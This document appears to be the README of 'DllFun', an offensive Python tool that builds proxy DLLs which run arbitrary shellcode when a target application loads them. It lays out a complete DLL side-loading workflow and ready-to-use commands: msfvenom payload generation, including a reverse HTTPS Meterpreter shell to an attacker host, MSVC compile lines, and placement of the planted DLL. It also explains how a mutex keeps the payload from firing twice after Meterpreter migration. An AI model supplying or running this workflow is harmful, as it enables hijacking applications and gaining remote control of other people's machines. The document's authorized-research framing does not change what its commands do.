# DllFun

A Python utility for generating proxy DLL source code for DLL side-loading research and vulnerability proof-of-concept development. Given an original DLL and a raw shellcode binary, it parses the DLL's export table and produces a ready-to-compile C++ source file that forwards all exports to the original DLL while executing arbitrary shellcode on load.

> **Intended for authorized security research, penetration testing, and CVE proof-of-concept development only.**

---

## How It Works

1. Parses the export table of the original (renamed) DLL using `pefile`
2. Generates `#pragma comment(linker, "/export:...")` directives to forward every export — by name and ordinal — to the renamed original
3. Embeds the raw shellcode binary as a C byte array
4. Generates a `DllMain` that loads the original DLL, spawns a thread, and executes the shellcode
5. Uses a `Global\` named mutex to prevent duplicate execution if the target application is launched multiple times

---

## Requirements

```
pip install pefile
```

MSVC compiler (`cl.exe`) via Visual Studio Build Tools for compilation.

---

## Usage

```
python dllfun.py <original_dll> <shellcode_bin> [options]
```

### Arguments

| Argument | Description |
|---|---|
| `original_dll` | Path to the renamed original DLL (e.g. `dbghelp_orig.dll`) |
| `shellcode_file` | Path to the raw shellcode binary (e.g. `shellcode.bin`) |
| `--proxy-target` | Override the forwarding target name (default: derived from filename) |
| `--output` | Output `.cpp` filename (default: `dllmain.cpp`) |
| `--mutex` | Override the Global mutex name (default: derived from proxy target) |

### Example

```
python dllfun.py dbghelp_orig.dll shellcode.bin --output dbghelp_dllmain.cpp
```

Output:
```
[*] proxy_target not specified, using: dbghelp_orig
[*] Mutex name: Global\DbghelpWorker
[+] Success! Generated dbghelp_dllmain.cpp
    Shellcode : 510 bytes
    Exports   : 504 forwarded
    Target    : dbghelp_orig.dll
```

---

## Compilation

The script prints the correct compile command for your target architecture after generation.

### 32-bit — run from x86 Native Tools Command Prompt for VS

```
cl.exe /MT /arch:IA32 /LD dllmain.cpp /Fe:dbghelp.dll User32.lib /link /MACHINE:X86 /SUBSYSTEM:WINDOWS,5.01
```

### 64-bit — run from x64 Native Tools Command Prompt for VS

```
cl.exe /MT /LD dllmain.cpp /Fe:dbghelp.dll User32.lib /link /MACHINE:X64 /SUBSYSTEM:WINDOWS
```

---

## Workflow

```
1. Identify a vulnerable application and target DLL via Process Monitor
       (look for NAME NOT FOUND probes in the application directory)

2. Copy the correct bitness of the DLL from System32 or SysWOW64
       64-bit: C:\Windows\System32\target.dll
       32-bit: C:\Windows\SysWOW64\target.dll

3. Rename the original:
       ren target.dll target_orig.dll

4. Generate your shellcode:
       msfvenom -p windows/x64/exec CMD=calc.exe -f raw > shellcode.bin

5. Run dllfun.py:
       python dllfun.py target_orig.dll shellcode.bin

6. Compile with the printed command from the correct VS prompt

7. Place target.dll, target_orig.dll alongside the vulnerable executable and launch
```

---

## Features

- **Automatic export forwarding** — handles named exports, ordinal-only exports, and COM exports (`DllCanUnloadNow`, `DllGetClassObject`, etc.) that require the `PRIVATE` flag to avoid LNK4222 warnings
- **Ordinal preservation** — forces each export to its original ordinal so the proxy is a drop-in replacement
- **Correct shellcode encoding** — emits `\xHH` hex escapes that C interprets correctly as raw bytes
- **Global mutex deduplication** — uses a `Global\` namespace mutex so that re-launching the target application does not fire the payload a second time; the mutex persists in the migrated process after Meterpreter-style migration
- **Architecture agnostic** — works for both 32-bit and 64-bit targets; prints the correct compile command for each
- **Auto-derived names** — proxy target, output filename, and mutex name are all derived from the input DLL name automatically; all can be overridden via CLI flags

---

## Generating Payloads

**Pop calculator (PoC / CVE report):**
```
# 64-bit
msfvenom -p windows/x64/exec CMD=calc.exe -f raw > shellcode.bin

# 32-bit
msfvenom -p windows/exec CMD=calc.exe -f raw > shellcode.bin
```

**Reverse HTTPS Meterpreter:**
```
# 64-bit
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw > shellcode.bin

# 32-bit
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw > shellcode.bin
```

---

## Disclaimer

This tool is provided for **authorized security research and educational purposes only**. Use against systems you do not own or have explicit written permission to test is illegal. The author assumes no liability for misuse.
